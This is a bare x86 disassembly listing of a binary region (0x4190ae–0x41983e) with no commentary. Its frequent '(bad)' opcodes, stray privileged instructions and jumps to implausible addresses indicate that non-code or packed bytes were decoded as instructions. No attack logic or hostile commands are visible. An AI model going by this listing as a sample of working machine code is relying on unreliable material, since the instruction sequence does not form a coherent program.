  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
